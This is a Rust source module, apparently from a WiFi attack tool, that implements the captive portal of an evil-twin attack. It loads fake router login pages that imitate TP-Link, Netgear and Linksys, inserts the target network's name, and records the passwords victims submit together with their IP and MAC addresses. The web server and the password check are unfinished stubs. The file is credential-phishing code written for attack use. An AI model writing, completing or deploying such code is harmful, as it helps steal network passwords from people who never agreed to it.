/*!
 * Captive Portal Web Server
 *
 * Serves HTML templates and handles credential submission.
 * Note: Full web server implementation requires actix-web dependency.
 */

use crate::core::evil_twin::{
    CapturedCredential, EvilTwinParams, EvilTwinProgress, PortalTemplate,
};
use std::sync::{Arc, Mutex};

/// Load template content from file
pub fn load_template(template: PortalTemplate) -> Result<String, std::io::Error> {
    let template_name = match template {
        PortalTemplate::Generic => "generic.html",
        PortalTemplate::TpLink => "tplink.html",
        PortalTemplate::Netgear => "netgear.html",
        PortalTemplate::Linksys => "linksys.html",
    };

    // Try multiple possible locations
    let possible_paths = vec![
        format!("src/templates/{}", template_name),
        format!("templates/{}", template_name),
        format!("/tmp/brutifi_templates/{}", template_name),
    ];

    for path in possible_paths {
        if let Ok(content) = std::fs::read_to_string(&path) {
            return Ok(content);
        }
    }

    // Fallback: return embedded minimal template
    Ok(format!(
        r#"<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - {{{{ssid}}}}</title>
</head>
<body>
    <h1>WiFi Network: {{{{ssid}}}}</h1>
    <form method="POST" action="/submit">
        <input type="password" name="password" required>
        <button type="submit">Connect</button>
    </form>
</body>
</html>"#
    ))
}

/// Replace template variables with actual values
pub fn render_template(template_content: &str, ssid: &str) -> String {
    template_content.replace("{{ssid}}", ssid)
}

/// Handle credential submission (validation logic)
pub fn handle_credential_submission(
    _params: &EvilTwinParams,
    password: String,
    client_ip: String,
    _client_mac: String,
    credentials: Arc<Mutex<Vec<CapturedCredential>>>,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
) -> bool {
    let _ = progress_tx.send(EvilTwinProgress::CredentialAttempt {
        password: password.clone(),
    });

    // Store credential
    if let Ok(mut creds) = credentials.lock() {
        creds.push(CapturedCredential {
            ssid: _params.target_ssid.clone(),
            password: password.clone(),
            client_mac: _client_mac.clone(),
            client_ip: client_ip.clone(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            validated: false,
        });
    }

    // TODO: Actual validation against real AP
    // For now, we'll just return false (not validated)
    // In a full implementation, this would call validate_password_against_ap

    let _ = progress_tx.send(EvilTwinProgress::ValidationFailed {
        password: password.clone(),
    });

    false
}

/// Start captive portal web server (stub)
///
/// Full implementation requires actix-web dependency.
/// This is a placeholder that would need to be implemented
/// with a proper async web framework.
pub async fn start_captive_portal(
    _params: &EvilTwinParams,
    _credentials: Arc<Mutex<Vec<CapturedCredential>>>,
    _progress_tx: tokio::sync::mpsc::UnboundedSender<EvilTwinProgress>,
    _stop_flag: Arc<std::sync::atomic::AtomicBool>,
) -> Result<(), String> {
    // TODO: Implement with actix-web or similar
    // For now, return error indicating it's not implemented
    Err("Captive portal web server requires actix-web dependency (not yet implemented)".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_load_template_fallback() {
        // Should return fallback template if files don't exist
        let result = load_template(PortalTemplate::Generic);
        assert!(result.is_ok());
        let content = result.unwrap();
        assert!(content.contains("{{ssid}}"));
        assert!(content.contains("password"));
    }

    #[test]
    fn test_render_template() {
        let template = "Network: {{ssid}}, Password: {{ssid}}";
        let rendered = render_template(template, "TestNetwork");
        assert_eq!(rendered, "Network: TestNetwork, Password: TestNetwork");
    }

    #[test]
    fn test_render_template_multiple_occurrences() {
        let template = "{{ssid}} - {{ssid}}";
        let rendered = render_template(template, "WiFi");
        assert_eq!(rendered, "WiFi - WiFi");
    }
}
